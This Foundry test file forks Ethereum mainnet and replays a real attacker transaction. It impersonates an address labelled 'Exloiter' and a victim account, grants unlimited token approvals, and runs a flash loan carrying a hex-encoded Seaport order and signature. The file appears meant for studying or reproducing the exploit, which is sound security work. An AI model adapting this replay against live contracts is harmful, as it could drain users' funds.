// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "src/FlashBuyer.sol";

contract FlashBuyerTest is Test {
    uint256 forkId;
    IFlashLoans vault;
    IERC20 ft;
    SeaportInterface seaport;

    function setUp() public {
        string memory MAINNET_RPC_URL = vm.envString("MAINNET_RPC_URL");
        address VAULT_ADDRESS = vm.envAddress("VAULT_ADDRESS");
        address FT_ADDRESS = vm.envAddress("FT_ADDRESS");
        address SEAPORT_ADDRESS = vm.envAddress("SEAPORT_ADDRESS");
        vm.label(FT_ADDRESS, "FT");
        vm.label(SEAPORT_ADDRESS, "Seaport");
        vm.label(VAULT_ADDRESS, "Vault");

        forkId = vm.createSelectFork(MAINNET_RPC_URL, 16671787);
        vault = IFlashLoans(address(VAULT_ADDRESS));
        ft = IERC20(address(FT_ADDRESS));
        seaport = SeaportInterface(address(SEAPORT_ADDRESS));

    }

    function testFlashBuyerOriginal() public {
        // lets repeat market attacker tx: https://etherscan.io/tx/0xc3af5b478d1580272e4881eafd2495ec4a3367a570370013a9d44c3e7ef50845
        vm.label(0x4d18A24ab0E2c30069f235338B7DD3c67E4Fa77e, "Exloiter");
        vm.label(0x31d843b99c2c4088cD20D96EF2426673b958Ff70, "MM");
        vm.label(0xcD31c23B84475a7392E2f86119Be188BC2e7F197, "mechminds.eth");

        vm.prank(0x4d18A24ab0E2c30069f235338B7DD3c67E4Fa77e);

        FlashBuyer flasher = new FlashBuyer(
            address(vault),
            address(seaport),
            address(ft)
        );
        vm.prank(0xcD31c23B84475a7392E2f86119Be188BC2e7F197);
        IERC20(ft).approve(address(flasher), 99999999999999999999999999999999999);

        vm.prank(0x4d18A24ab0E2c30069f235338B7DD3c67E4Fa77e);
        IERC20(ft).approve(address(flasher), 99999999999999999999999999999999999);

        flasher.approveWeth();

        flasher.flashLoan(125000e18, hex"0000000000000000000000000000000000000000000000000000000000000020000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc20000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001a5661dbcd0208fc00000000000000000000000000004d18a24ab0e2c30069f235338b7dd3c67e4fa77e000000000000000000000000004c00500000ad104d7dbd00e3ae0a5c00560c0000000000000000000000000031d843b99c2c4088cd20d96ef2426673b958ff700000000000000000000000000000000000000000000000000000000000001e090000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000000a0000000000000000000000000000000000000000000000000000000063f3b9cd00000000000000000000000000000000000000000000000000000000641895bd0000000000000000000000000000000000000000000000000000000000000000360c6ebe00000000000000000000000000000000000000000fdad426df408f860000007b02230091a7ed01230072f7006a004d60a8d4e71d599b8104250f00000000007b02230091a7ed01230072f7006a004d60a8d4e71d599b8104250f00000000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000000000000000000024000000000000000000000000000000000000000000000000000000000000002a00000000000000000000000000000000000000000000000000000000000000001000000000000000000000000000000000000000000000021e19e0c9bab240000000000000000000000000000cd31c23b84475a7392e2f86119be188bc2e7f1970000000000000000000000000000000000000000000000000000000000000041973b9c016b9e7735f23d4b293535ae8165268daaa11a88127a81a0b45c956c463d7c61639e46a7a25b1e2f2140542d70c4cc8e8640a726e6d77e3383f7e045ec1b0000000000000000000000000000000000000000000000000000000000000000000000360c6ebe");
    }
}

